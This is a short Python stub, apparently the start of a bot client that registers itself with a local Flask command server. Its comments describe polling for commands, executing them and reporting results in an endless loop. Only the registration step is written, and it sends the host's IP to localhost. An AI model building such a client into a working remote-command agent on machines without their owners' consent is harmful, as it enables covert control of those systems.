# this bot will connect to the flask app and send it data. will also receive command data periodically.
# Ping database for botObject every x seconds, process commands, return sucess/failure, update database
# runs in infinite loop

import threading
import requests
import socket
base_url = 'http://localhost:5000/'


bot_ip = socket.gethostbyname(socket.gethostname())
bot_name = "fromArgsParse"
def register_bot():
    url = base_url+'bots'
    data = {
        "botAlias":bot_name,
        "botId": 3, #auto increment in database
        "botTaskQueue": [],
        "botStatus": "offline",
        "lastCmdStatus": {
            "cmd": "dir",
            "status": "failure",
            "echoCmd": ""
        },
        "botIp": bot_ip
    }
    response = requests.post(url, json = data)
    
#end def